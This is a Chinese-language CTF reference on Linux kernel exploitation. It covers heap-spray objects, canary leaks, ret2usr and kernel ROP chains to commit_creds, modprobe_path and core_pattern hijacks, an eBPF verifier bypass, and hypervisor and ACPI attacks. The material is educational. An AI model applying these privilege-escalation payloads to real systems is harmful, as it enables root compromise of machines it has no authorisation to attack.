# CTF Pwn - Linux 内核利用

## 目录
- [环境搭建与侦察](#environment-setup-and-recon)
  - [QEMU 调试环境](#qemu-debug-environment)
  - [提取 vmlinux](#extracting-vmlinux)
  - [内核配置检查](#kernel-config-checks)
  - [FGKASLR 检测](#fgkaslr-detection)
- [用于堆喷的有用内核结构](#useful-kernel-structures-for-heap-spray)
  - [tty_struct (kmalloc-1024)](#tty_struct-kmalloc-1024)
  - [tty_file_private (kmalloc-32)](#tty_file_private-kmalloc-32)
  - [poll_list (kmalloc-32 到 1024)](#poll_list-kmalloc-32-to-1024)
  - [user_key_payload (kmalloc-32 到 1024)](#user_key_payload-kmalloc-32-to-1024)
  - [setxattr 临时缓冲区 (kmalloc-32 到 1024)](#setxattr-temporary-buffer-kmalloc-32-to-1024)
  - [seq_operations (kmalloc-32)](#seq_operations-kmalloc-32)
  - [subprocess_info (kmalloc-128)](#subprocess_info-kmalloc-128)
- [内核栈溢出与 canary 泄露](#kernel-stack-overflow-and-canary-leak)
- [权限提升原语](#privilege-escalation-primitives)
  - [ret2usr（无 SMEP/SMAP）](#ret2usr-no-smepsmap)
  - [基于 prepare_kernel_cred / commit_creds 的内核 ROP](#kernel-rop-with-prepare_kernel_cred--commit_creds)
  - [保存与恢复用户态状态](#saving-and-restoring-userland-state)
- [modprobe_path 覆写](#modprobe_path-overwrite)
  - [技术概述](#technique-overview)
  - [无泄露的暴力破解](#bruteforce-without-leak)
  - [检查 CONFIG_STATIC_USERMODEHELPER](#checking-config_static_usermodehelper)
- [core_pattern 覆写](#core_pattern-overwrite)
- [通过 kmalloc 大小不匹配导致的内核堆溢出（PlaidCTF 2013）](#kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013)
- [eBPF 验证器绕过利用（UIUCTF 2021，D^3CTF 2022）](#ebpf-verifier-bypass-exploitation-uiuctf-2021-d3ctf-2022)
- [通过 I/O 端口 Hypercalls 实现用户-内核-虚拟机管理程序链（HITCON 2018）](#user-kernel-hypervisor-chain-via-io-port-hypercalls-hitcon-2018)
- [ACPI DSDT Shellcode 注入实现权限提升（hxp 2018）](#acpi-dsdt-shellcode-injection-for-privilege-escalation-hxp-2018)
- [ARM fcntl64 set_fs() CVE-2015-8966 管道数据外泄（Insomnihack 2019）](#arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil-insomnihack-2019)

关于 tty_struct kROP（内核 Return-Oriented Programming）、userfaultfd 竞态稳定、SLUB 内部机制、跨缓存攻击以及 DiceCTF 2026 内核模式，详见 [kernel-techniques.md](kernel-techniques.md)。

关于防护绕过技术（KASLR、FGKASLR、KPTI、SMEP、SMAP）、GDB 调试、initramfs 工作流和利用模板，详见 [kernel-bypass.md](kernel-bypass.md)。

---

## 环境搭建与侦察

**关键洞察：** 在编写任何利用代码之前，检查 QEMU 启动脚本中启用的防护措施（`smep`、`smap`、`kpti`、`kaslr`）以及 `oops=panic` 标志。这些决定了可行的利用技术。初期调试时禁用所有防护，然后逐一重新启用。

### QEMU 调试环境

内核挑战调试的标准 QEMU 启动脚本：

```bash
qemu-system-x86_64 \
  -kernel ./bzImage \
  -initrd ./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` 启用 GDB 监听端口 1234（`target remote :1234`）
- `-append "nokaslr"` 禁用 KASLR 以便调试
- 检查 QEMU 脚本中是否包含：`smep`、`smap`、`kaslr`、`oops=panic`、`kpti=1`
- 如果缺少 `oops=panic`，内核 oops 只会杀死出错进程（可利用 dmesg 泄露信息）

**初期调试时禁用防护**，修改启动脚本为：
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # 替代 kvm64,+smep,+smap
```
### 提取 vmlinux

**从 bzImage 中提取 vmlinux：**
```bash
# 使用 Linux 内核源码中的 extract-vmlinux.sh（scripts/extract-vmlinux）
./extract-vmlinux ./bzImage > vmlinux

# 提取 ROP gadgets
ROPgadget --binary ./vmlinux > gadgets.txt
```

### 内核配置检查

| 配置项 | 作用 | 如何检查 |
|--------|--------|-------------|
| SMEP/SMAP/KASLR/KPTI | CPU 级别的缓解措施 | 检查 QEMU 启动脚本中的 `-cpu` 和 `-append` 参数 |
| FGKASLR | 每个函数的随机化 | `readelf -S vmlinux` 的节区数量（见下文） |
| `SLAB_FREELIST_RANDOM` | freelist 顺序随机化 | 顺序分配的对象不相邻 |
| `SLAB_FREELIST_HARDEN` | 使用 XOR 混淆的空闲指针 | 在 GDB 中检查 freelist 指针 |
| `STATIC_USERMODEHELPER` | 阻止覆盖 `modprobe_path` | 反汇编 `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `/proc/kallsyms` 中包含 `.data` 符号 | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | 启用 userfaultfd 系统调用 | 尝试调用，禁用时返回 -ENOSYS |
| eBPF JIT (扩展 Berkeley Packet Filter) | JIT 编译的 BPF 过滤器 | `cat /proc/sys/net/core/bpf_jit_enable`（0=关闭，1=开启，2=调试） |

检查 oops 行为：
- QEMU `-append` 中带 `oops=panic` -> oops 导致内核完全 panic
- 不带该参数 -> oops 只杀死出错进程；dmesg 可能泄露堆栈/堆/内核基址指针

### FGKASLR 检测

Fine-Grained KASLR 会对每个函数独立随机化。通过统计 ELF 节区数量检测：

```bash
readelf -S vmlinux | tail -5
# FGKASLR 关闭时：约 30 个节区
# FGKASLR 开启时：36000+ 个节区（每个函数一个）

file vmlinux
# FGKASLR 开启时：显示 "too many section (36140)"
```

---

## 用于堆喷射的有用内核结构体

这些结构体从标准的 `kmalloc` 缓存分配，并可由用户空间控制。利用它们填充已释放的槽位以进行 UAF 利用或泄露内核指针。

**关键点：** 根据易受攻击对象的 `kmalloc` 缓存大小选择合适的喷射结构体。对于 kmalloc-32，使用 `seq_operations` 或 `tty_file_private`；对于 kmalloc-1024，使用 `tty_struct`；对于可变大小（32-1024），使用 `poll_list`、`user_key_payload` 或 `setxattr`。

| 结构体 | 缓存 | 分配触发 | 释放触发 | 用途 |
|-----------|-------|---------------|--------------|-----|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | 内核基址泄露，RIP 劫持 |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | 内核堆泄露（指向 `tty_struct`） |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` 返回 | 内核堆泄露，任意释放 |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | 任意值写入 |
| `setxattr` 缓冲区 | kmalloc-32~1024 | `setxattr()` | 同一调用路径 | 瞬时任意值写入 |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | 内核基址泄露，RIP 劫持 |
| `subprocess_info` | kmalloc-128 | 内核内部 | 内核内部 | 内核基址泄露，RIP 劫持 |

### tty_struct（kmalloc-1024）

在调用 `open("/dev/ptmx")` 时分配，调用 `close()` 时释放。大小：0x2B8 字节。

```c
struct tty_struct {
    int magic;                    // +0x00: 必须是 0x5401（防护检查）
    struct kref kref;             // +0x04: 引用计数
    struct device *dev;           // +0x08
    struct tty_driver *driver;    // +0x10: 必须是有效的内核堆指针
    const struct tty_operations *ops; // +0x18: 虚表指针 -> 内核基址泄露
    // ...
};
```

- **内核基址泄露：** 读取 `tty_struct.ops` —— 指向内核 `.data` 中的 `ptm_unix98_ops`（或类似）
- **RIP 劫持：** 覆盖 `tty_struct.ops` 指向伪造虚表，随后 `ioctl()` 调用 `tty->ops->ioctl()`
- **magic** 必须保持为 `0x5401`，否则 `tty_ioctl()` 会立即返回（防护检查）
- **driver** 必须是有效的内核堆指针，否则内核会 oops
### tty_file_private (kmalloc-32)

在 `tty_alloc_file()` 中与 `tty_struct` 一起分配。大小：0x20 字节。

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: 指向 kmalloc-1024 中 tty_struct 的指针
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

- **堆泄露（kheap leak）：** 读取 `tty_file_private.tty` 可获取 kmalloc-1024 中的地址

### poll_list (kmalloc-32 到 1024)

在 `poll()` 调用期间分配，`poll()` 完成时释放（定时器到期或事件触发）。缓存大小取决于被轮询的文件描述符数量。

```c
struct poll_list {
    struct poll_list *next;   // +0x00: 链表指针
    int len;                  // +0x08: 条目数量
    struct pollfd entries[];  // +0x0C: 可变长度数组
};
```

- **任意释放（Arbitrary free）：** 覆盖 `poll_list.next` -> 当 `poll()` 结束时，会释放链表中的所有条目，包括被篡改的指针 -> 导致对任意地址的 UAF

### user_key_payload (kmalloc-32 到 1024)

通过 `add_key()` 系统调用分配。缓存大小取决于 `data` 长度。

```c
struct user_key_payload {
    struct callback_head rcu;     // +0x00: 16 字节，初始化前未被触碰
    unsigned short datalen;       // +0x10
    char data[];                  // +0x18: 用户控制的内容
};
```

- 前 16 字节在 GC 回调之前未初始化 —— 可结合 UAF 泄露残留堆数据
- 释放需要调用 `keyctl_revoke()` 并等待 GC
- 默认 Docker seccomp 配置阻止该操作

### setxattr 临时缓冲区 (kmalloc-32 到 1024)

`setxattr("file", "user.x", data, size, XATTR_CREATE)` 分配一个缓冲区，复制用户数据，然后在同一路径调用中释放。

- **瞬时写入（Momentary write）：** 可结合未初始化结构体写入任意值到已释放的块
- 不能用于持久喷射（立即释放）
- 传给 `setxattr()` 的文件必须存在 —— 利用时常见的坑是执行目录与预期不同

### seq_operations (kmalloc-32)

打开 `/proc/self/stat`（或类似 seq_file）时分配。包含用于 kbase 泄露的函数指针。

### subprocess_info (kmalloc-128)

内核内部结构，含函数指针。在特定场景下有助于 kbase 泄露和 RIP 劫持。

---

## 内核栈溢出与 Canary 泄露

带有易受攻击的读写处理函数的内核模块通常允许栈缓冲区溢出。利用模式类似用户态栈溢出，但需管理内核特有的寄存器状态。

**通过超大读取泄露 Canary（hxp CTF 2020）：**

一个易受攻击的 `hackme_read()` 从 32 元素的栈数组 `tmp[32]` 复制数据，但允许读取最多 0x1000 字节 —— 泄露了栈 canary 和缓冲区后面的内核文本指针。

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// 读取超出栈缓冲区，泄露 canary + 内核指针
read(fd, leak, sizeof(leak));

// 栈布局：tmp[32] 在 rbp-0x98，canary 在 rbp-0x18
// canary 位于索引 16（距离缓冲区起始偏移 0x80）
unsigned long cookie = leak[16];

// 内核文本指针位于索引 38 -> 计算 KASLR 基址
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**栈溢出 payload 结构：**

```c
unsigned long payload[50];
int off = 16;                    // canary 位置偏移
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // 填充 (rbx)
payload[off++] = 0x0;            // 填充 (r12)
payload[off++] = 0x0;            // 保存的 rbp
payload[off++] = rop_start;      // 返回地址 -> ROP 链
// ... 后续 ROP 链 ...
write(fd, payload, sizeof(payload));
```

**基于 ioctl 的大小检查绕过（K3RN3LCTF 2021）：**

某些模块通过全局变量 `MaxBuffer` 限制写入长度，而该变量可通过 `ioctl()` 控制：

```c
// 模块中的易受攻击模式：
// swrite() 检查：if (MaxBuffer < user_size) return -EFAULT;
// sioctl() 命令 0x20：MaxBuffer = (int)arg;  <- 攻击者控制

// 利用：溢出前先增大 MaxBuffer
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // 将 MaxBuffer 设为 300（缓冲区仅 128）
write(fd, overflow_payload, 300); // 通过大小检查 -> 栈溢出
```

**关键洞察：** 内核栈 canary 与用户态 canary 工作机制相同。易受攻击的读处理函数复制超出缓冲区大小的数据，会泄露 canary 和保存的寄存器，包括用于 KASLR 绕过的内核文本指针。注意查找修改用于边界检查的全局变量的 `ioctl` 处理函数 —— 它们常用于绕过写入大小限制。

---
## Privilege Escalation Primitives

### ret2usr（无 SMEP/SMAP）

当 SMEP 和 SMAP 被禁用时，内核可以直接执行用户态代码并访问用户态内存。将 RIP 劫持到调用 `prepare_kernel_cred(0)` 和 `commit_creds()` 的用户态函数。

```c
// 地址来自 /proc/kallsyms（或泄露）
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// 用于 iretq 返回的保存的用户态状态
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) -> 初始化 cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // 恢复用户态的 GS 基址
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // 以 root 身份返回用户态
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

`privesc()` 返回用户态后，进程拥有 root 权限。调用 `system("/bin/sh")` 获取 root shell。

### 使用 prepare_kernel_cred / commit_creds 的内核 ROP

当 SMEP 启用时，构造内核 ROP 链调用 `prepare_kernel_cred(0)` -> 将结果传给 `commit_creds()` -> 返回用户态。

```c
// 查找 gadget: ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax" ./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax; ...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary 偏移
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP 链：prepare_kernel_cred(0) -> commit_creds(结果)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (新 cred)
payload[off++] = 0x0;                      // pop rbx 填充
payload[off++] = commit_creds;

// 返回用户态
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp 填充
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**关键 gadget：`mov rdi, rax`** —— 用于将 `prepare_kernel_cred()` 的返回值（在 RAX 中）传递给 `commit_creds()`（参数在 RDI 中）。搜索类似 `mov rdi, rax; ... ; ret` 的变体，注意可能会破坏其他寄存器。

**工具：** `ropr` 比 ROPgadget 在大型内核镜像中更快：
```bash
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
```

### 保存和恢复用户态状态

在触发内核漏洞前，保存用户态寄存器状态以供 `iretq` 返回使用：

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // 返回后调用的函数
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc 失败\n");
        exit(1);
    }
}
```

**寄存器值（x86_64 用户态）：**
- `CS` = 0x33（64 位用户代码段）
- `SS` = 0x2b（64 位用户栈段）
- `RSP` = 当前用户态栈指针
- `RFLAGS` = 当前标志寄存器
- `RIP` = 漏洞利用后函数地址（如 `spawn_shell`）

---
## modprobe_path 覆盖

### 技术概述

覆盖全局变量 `modprobe_path`（默认值：`"/sbin/modprobe"`）为攻击者控制的脚本路径。当内核遇到格式未知的二进制文件时，会以 root 权限执行 `modprobe_path` 指定的程序。

**前提条件：**
1. 任意地址写入（AAW）能力，用于覆盖 `modprobe_path`
2. 能够创建两个文件：一个格式错误的二进制文件和一个恶意脚本
3. `CONFIG_STATIC_USERMODEHELPER` 被禁用

**步骤：**

```bash
# 1. 写入恶意脚本
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. 使用你的 AAW 原语覆盖 modprobe_path 为 "/tmp/evil.sh"

# 3. 创建并执行格式错误的二进制文件（前4字节不可打印）
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. 读取 flag
cat /tmp/output
```

**原理说明：** `execve()` -> `search_binary_handler()` -> 无匹配格式 -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> 以 root 权限执行 `modprobe_path`。

**关键点：** 触发二进制文件的前4字节必须是不可打印字符（非 ASCII，允许制表符和换行符除外）。如果是可打印字符，内核会跳过 `request_module()` 调用。

### 无泄露情况下的暴力破解

`modprobe_path` 在 KASLR 下只有 1 字节的熵（随机化的页偏移）。利用 AAW，暴力猜测地址：

```python
# modprobe_path 基地址（无 KASLR 调试时获取）
MODPROBE_BASE = 0xffffffff8265ff00
# KASLR 下，只有 0x65 字节变化
# 尝试 256 个偏移
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### 检查 CONFIG_STATIC_USERMODEHELPER

如果启用，`call_usermodehelper_setup()` 会忽略 `modprobe_path`，使用硬编码常量。

**通过反汇编检测：**

```bash
# 1. 获取函数地址
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. 设置 GDB 断点并触发
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. 在 GDB 中反汇编并检查：
# 未启用：rdi 在 +9 处保存到 r14，+127 处使用 -> 传递了 modprobe_path
# 启用：+122 处使用立即数常量替代 r14 -> 第一个参数（modprobe_path）被忽略
```

**启用时：** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH`（常量）。覆盖 `modprobe_path` 无效。需寻找其他本地提权技术。

---

## core_pattern 覆盖

`modprobe_path` 的替代方案。覆盖 `/proc/sys/kernel/core_pattern`（或内部变量 `core_pattern`）为管道命令。当进程崩溃时，内核以 root 权限执行指定命令处理 core dump。

```bash
# core_pattern 以管道开头：首字符 '|' 表示执行命令
# 覆盖 core_pattern 为： "|/tmp/evil.sh"
# 然后让进程崩溃触发
```

**寻找偏移：** `core_pattern` 未启用 `CONFIG_KALLSYMS_ALL` 时不会导出到 `/proc/kallsyms`。寻找方法：

1. 在 `override_creds()`（由 `do_coredump()` 调用）设置断点
2. 让进程崩溃：`int main() { ((void(*)())0)(); }`
3. `override_creds` 返回后反汇编，查找从数据地址加载的 `movzx` 指令
4. 该地址即为 `core_pattern`

**关键点：** 当 `CONFIG_STATIC_USERMODEHELPER` 阻止 modprobe 时，`core_pattern` 是替代方案。覆盖为 `|/tmp/evil.sh`，崩溃任意进程即可触发 root 命令执行。由于 `core_pattern` 不总是导出，需要在故意崩溃时对 `override_creds` 断点调试定位。

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---
## Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)

**模式：** 内核模块分配 `kmalloc(content_length)`，但复制了 `0x40 + content_length` 字节（头部 + 正文），导致 0x40 字节的堆溢出进入相邻的 slab 对象。

```c
// 内核 HTTP 处理程序中的易受攻击模式：
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);           // 0x40 字节的头部
memcpy(buf + 0x40, body, content_length); // 溢出！
```

**利用步骤：**
1. **Slab 喷射：** 打开 1021 个文件描述符（`open("/dev/kmalloc_target")`）以填满 kmalloc-256 slab 缓存
2. **制造空洞：** 关闭 3 个文件，在 slab 中为溢出分配创建空隙
3. **触发溢出：** 发送带有正文的 HTTP 请求，正文溢出到相邻的 `struct file`
4. **破坏 `f_op`：** 覆盖相邻 `struct file` 中的 `f_op`（文件操作）指针，重定向函数指针
5. **劫持写处理程序：** `f_op->write` 现在指向攻击者控制的地址 → `commit_creds(prepare_kernel_cred(0))`

**关键洞察：** `struct file` 位于 kmalloc-256 中，包含 `f_op`（函数指针表）。破坏 `f_op` 指向伪造的虚表可控制任意文件操作（`read`、`write`、`ioctl`）。攻击者通过被破坏的文件描述符触发劫持的操作。

---

## eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)

利用 eBPF 验证器的静态分析与运行时行为不匹配，实现任意内核读写。

```c
// 模式：验证器跟踪寄存器状态与硬件不同
// 示例：右移不同步（D^3CTF 2022）
// 验证器认为：shr reg, 64 -> reg = 0
// 硬件执行：   shr reg, 64 -> reg = 原始值（移位 >= 宽度为未定义）

// 第一步：创建不同步寄存器
BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),  // 验证器：R7=0，运行时：R7=1

// 第二步：利用不同步绕过 ALU 消毒器
BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),  // 验证器：0*offset=0，运行时：1*offset=offset

// 第三步：加到 map 指针实现 OOB 访问
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // 验证器允许（加 0）
// 运行时：map_ptr + offset -> 任意内核内存访问

// 第四步：读写内核内存，覆盖 modprobe_path 或 cred 结构
```

```bash
# eBPF 利用流程：
# 1. 找到验证器与运行时不匹配（RSH、边界跟踪、helper 参数）
# 2. 创建验证器值 != 运行时值的寄存器
# 3. 利用不同步寄存器绕过指针算术检查
# 4. 通过 map 值 OOB 实现任意读
# 5. 从相邻 slab 对象泄露内核基址
# 6. 任意写入 modprobe_path 或 current->cred

# helper 函数溢出变种（d3bpf-v2）：
# bpf_skb_load_bytes(skb, offset, stack_buf, len)
# 验证器检查 len <= 512，但不同步导致运行时 len 很大
# 栈缓冲区溢出 -> ROP 调用 commit_creds(init_cred)

# 通过 eBPF 绕过 KASLR：
# 触发可控 oops -> dmesg 泄露内核地址
# 或：读取包含内核指针的相邻 slab 对象
```

**关键洞察：** eBPF 验证器漏洞造成静态分析与运行时的“类型混淆”。模式总是：（1）找到验证器预测与硬件不同的操作，（2）放大差异以创建有用偏移，（3）加到 map 指针实现内核内存访问。查看内核变更日志中的 eBPF 验证器补丁——每个补丁都意味着之前存在可利用漏洞。

另见：[kernel-techniques.md](kernel-techniques.md) 获取更多内核利用技术。

---
## User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)

**模式：** 一个三层挑战（user.elf → kernel.bin → hypervisor）通过 kernel.bin 中强制执行的白名单限制用户空间的直接 hypercall。攻击者（1）破坏一个 RPN 计算器用户模式程序，使其能够向其 GOT 写入任意字节，(2) 利用该写入突破到内核模式，(3) 从内核模式通过在 I/O 端口 `0x8000..0x80FF` 上执行 `out dx, eax` 直接发出 hypercall，hypervisor 将其作为系统调用分发。最终的关键点是：hypervisor 只接受已经存在于内核内存中的字符串，因此使用故意失败的 `open()` 系统调用将目标路径写入内核缓冲区，然后用该缓冲区地址重新调用 hypercall。

```asm
; pivot 后在 kernel.bin 内运行的内核模式 stub
mov dx, 0x8000 + 5          ; I/O 端口 = 基址 + 系统调用号（这里是 open）
mov eax, <kernel_buffer>    ; 指向内核内存中的指针
out dx, eax                 ; hypervisor 从端口读取参数

mov dx, 0x8000 + 0          ; 系统调用 0 = read
mov eax, flag_buffer
out dx, eax
```

```python
# 通过 GOT 覆盖 pivot 到 kernel.bin 的用户模式 payload
from pwn import *
io = remote("challenge.hitcon", 1337)

# 1. RPN 计算器覆盖 got['strtol'] 为调用特权 hypercall stub 的内核 gadget。
payload = rpn_overwrite(target="strtol",
                        value=kernel_gadget_address)
io.sendline(payload)

# 2. 内核 stub 运行上述 I/O 端口序列并写回 flag。
io.recvuntil(b"flag{")
log.success(b"flag{" + io.recvuntil(b"}"))
```

**关键洞察：** 挑战堆叠的权限环越多，越需要明确区分*数据必须存在的位置*与*代码必须运行的位置*。HITCON Abyss 在用户空间 hypercall 上强制内核白名单，但内核代码本身仍可直接访问 hypervisor 端口。真实的虚拟机逃逸中也常见此模式：一个客户内核原语加上 I/O 端口写入绕过客户自身的系统调用表，直接到达 VMM。攻击 `kvm_guest_enter` 风格的 hypervisor 时，注意查找 VMM 捕获的内存映射 I/O 区域或端口范围——它们是伪装的 hypercall，且通常缺少正式 hypercall 接口所需的参数校验。

**参考资料：** HITCON CTF 2018 — Abyss I & II，writeups 11918, 11919, 11933, 11934, 11937, 11938

---

## ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)

**模式：** “绿色计算”风格挑战启动时加载攻击者控制的 ACPI 表。将 shellcode 嵌入 DSDT 的 `OperationRegion(SystemMemory, ...)` 中，并通过启动时的 `Field` 写入将其写入内核内存。修改目标函数如 `commit_creds`，使后续的 setuid 调用提升权限。

```asl
OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
Field (PWDN, AnyAcc, NoLock, Preserve) { JMPA, 0x400 }
JMPA = Buffer () { 0x41, 0x55, 0x41, 0x54, 0x48, /* shellcode */ }

OperationRegion (NISC, SystemMemory, 0x104ac24, 96)
Field (NISC, AnyAcc, NoLock, Preserve) { NICD, 768 }
NICD = Buffer () { 0x48, 0xc7, 0xc0, /* patched commit_creds prologue */ }
```

**关键洞察：** ACPI AML 在正常内核保护激活前直接访问物理内存。当挑战允许你提供 DSDT/SSDT 字节时，`SystemMemory` `OperationRegion` 是一个比大多数显式内核漏洞更强大的内核写入原语。

**参考资料：** hxp CTF 2018 — Green Computing 1-2，writeups 12550+

---
## ARM fcntl64 set_fs() CVE-2015-8966 管道泄露 (Insomnihack 2019)

**模式：** 漏洞：ARM Linux 上的 `fcntl64` 通过 `set_fs()` 设置了 `KERNEL_DS`，但从未恢复。利用方式：fork 出一个子进程调用 `fcntl64`，然后让子进程通过管道写入任意内核地址；父进程从管道读取。直接读取 MMU 区域会导致内核崩溃，因此管道作为安全的中介。

```c
if (fork() == 0) {
    trigger_fcntl64_bug();                // 现在处于 KERNEL_DS
    write(pipe_w, (void*)kernel_addr, N); // 未检查的内核读取
    _exit(0);
}
read(pipe_r, leak, N);                    // 父进程获取内核内存
```

泄露 cred 结构后，原地重写 `uid/gid/euid/egid = 0`，然后调用 `getuid()` 以确认已获得 root 权限。

**关键洞察：** 缺失 `set_fs(USER_DS)` 的恢复是一个单行错误，导致对内核地址的 copy_from/to_user 操作无限制。通过管道包装危险的读取操作，使内核复制循环永远不会直接触碰被禁止的 MMU 区域。

**参考资料：** Insomnihack 2019 teaser — 1118daysober，writeup 12903
